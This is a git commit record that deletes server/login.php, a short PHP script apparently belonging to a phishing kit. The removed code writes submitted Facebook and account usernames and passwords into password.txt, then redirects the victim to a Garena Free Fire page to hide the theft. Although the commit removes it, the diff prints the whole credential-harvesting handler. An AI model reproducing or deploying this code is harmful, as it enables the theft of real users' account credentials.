049f995645cf6148645b6f77cd98647f0ad9742b
WongBiasa <74451855+WongBiasa@users.noreply.github.com>
2021-01-07 14:50:48 +0700

    Delete login.php

--- server/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-
-file_put_contents("password.txt", "akun: " . $_POST['facebook'] . "Account: " . $_POST['text'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location : https://ff.garena.com/weapons/index/en/')
-exit();
